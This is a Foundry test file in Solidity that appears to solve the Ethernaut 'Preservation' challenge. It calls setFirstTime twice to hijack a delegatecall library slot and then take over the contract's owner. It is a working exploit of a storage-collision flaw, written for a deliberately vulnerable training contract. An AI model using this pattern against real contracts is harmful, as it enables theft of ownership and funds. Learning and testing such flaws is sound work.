// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Preservation, LibraryContract} from "../src/Preservation.sol";
import {Attack} from "../src/Attack.sol";

contract AttackTest is Test {
    Preservation public preservation;
    Attack public attack;

    function setUp() public {
        preservation = new Preservation(address(new LibraryContract()), address(new LibraryContract()));
        attack = new Attack();
    }

    function test_Exploit() public {
        preservation.setFirstTime(uint256(uint160(address(attack))));
        preservation.setFirstTime(uint256(uint160(address(this))));
        assertEq(preservation.owner(), address(this));
    }
}
